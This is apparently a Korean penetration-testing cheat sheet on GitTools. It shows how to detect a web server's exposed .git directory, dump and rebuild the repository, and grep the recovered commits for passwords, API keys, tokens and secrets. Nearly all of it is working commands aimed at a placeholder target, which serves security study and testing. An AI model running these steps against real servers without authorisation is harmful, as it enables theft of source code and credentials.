---
sidebar_position: 4
title: GitTools
---

# GitTools (노출된 .git 정보 탈취)

## Overview

**GitTools**: 웹 서버에 실수로 노출된 `.git` 디렉토리를 복원하고 커밋 히스토리를 분석하여 소스코드 및 민감 정보를 추출하는 도구 모음.

- **구성 요소**: `gitdumper.sh`(다운로드), `extractor.sh`(추출), `finder.sh`(검색)

---

## 1. Reconnaissance (탐지 및 덤프)

### .git 디렉토리 노출 확인
웹 서버 루트나 특정 경로에 `.git` 디렉토리가 접근 가능한지 확인
```bash
# 브라우저 또는 curl로 접근 시도
curl -s http://<target>/.git/config
# 응답에 [core] 항목이 보이면 노출 상태임
```

### gitdumper.sh (저장소 다운로드)
Directory Listing이 막혀 있더라도 `.git` 내부의 예측 가능한 파일들을 재귀적으로 다운로드하여 저장소 구조 복원
```bash
# 대상 URL에서 .git 폴더를 로컬의 target-git 폴더로 다운로드
./gitdumper.sh http://<target>/.git/ ./target-git
```

---

## 2. Exploitation (커밋 추출 및 분석)

### extractor.sh (커밋 해제)
다운로드된 불완전한 `.git` 파일에서 각 커밋 시점의 소스 코드를 폴더별로 추출
```bash
# target-git 폴더에서 커밋 데이터를 commits 폴더로 추출
./extractor.sh ./target-git/ ./commits/

# 결과 확인 (커밋별로 0-hash, 1-hash 형식의 폴더 생성)
ls -la ./commits/
```

### 수동 Git 명령어를 통한 정밀 분석
`gitdumper.sh`로 받은 디렉토리로 이동하여 표준 Git 명령어로 분석
```bash
cd ./target-git

# 전체 커밋 로그 확인
git log

# 삭제된 브랜치나 모든 변경 이력 추적
git log --all --full-history

# 특정 시점의 커밋 상태로 복원
git checkout <COMMIT_HASH>

# 특정 파일의 모든 변경 이력 추적
git log -p <FILE>
```

---

## 3. Advanced Techniques

### 민감 정보 (Credential / API Key) 자동 검색
추출된 전체 커밋 내역이나 소스코드에서 주요 키워드 일괄 검색
```bash
# 모든 커밋 폴더 대상 Grep 검색
grep -r -i "password\|passwd\|pwd" ./commits/
grep -r -i "api_key\|apikey\|token\|secret" ./commits/
grep -r -i "db_host\|database" ./commits/

# 설정 파일 및 환경변수 파일만 찾기
find ./commits/ -name "*.env" -o -name "config.*" -o -name "*.conf"

# Git 명령어로 패스워드 포함 커밋 검색
git log -p | grep -i "password"
```

### 손상된 .git 복구 기법
웹 방화벽(WAF) 등으로 일부 파일이 누락되어 `git checkout`이 안 되는 경우
- `extractor.sh`는 불완전한 팩(Pack) 파일을 처리하여 가능한 범위 내에서 코드를 복원함
- 수동으로 `.git/refs/heads/master` 파일 등을 조작하여 HEAD를 강제로 맞춘 후 `git reset --hard` 수행 가능
```
